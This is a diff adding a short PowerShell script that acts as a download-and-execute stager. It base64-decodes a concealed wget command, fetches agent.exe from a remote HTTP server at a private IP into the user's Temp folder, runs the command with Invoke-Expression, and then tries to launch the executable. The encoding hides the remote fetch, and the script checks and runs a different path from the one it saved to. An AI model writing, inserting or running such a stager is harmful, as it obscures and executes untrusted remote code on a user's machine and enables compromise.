@@ -1,0 +1,14 @@
+$encodedCommand = "d2dldCBodHRwOi8vMTAuMjA4LjI1NC4yMTg6ODAwMC9Eb3dubG9hZHMvYWdlbnQuZXhlIC1PdXRGaWxlIEM6XFVzZXJzXGx1ZmZ5XEFwcERhdGFcTG9jYWxcVGVtcFxhZ2VudC5leGU="
+$decodedCommand = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedCommand))
+Write-Host "Decoded Command: $decodedCommand"
+Invoke-Expression $decodedCommand
+$downloadedFilePath = "agent.exe"
+Start-Sleep -Seconds 2
+if (Test-Path -Path $downloadedFilePath) {
+    Write-Host "File downloaded successfully. Now attempting to run the file..."
+
+    # Execute the downloaded .exe file
+    Start-Process $downloadedFilePath
+} else {
+    Write-Host "The downloaded file does not exist at $downloadedFilePath."
+}
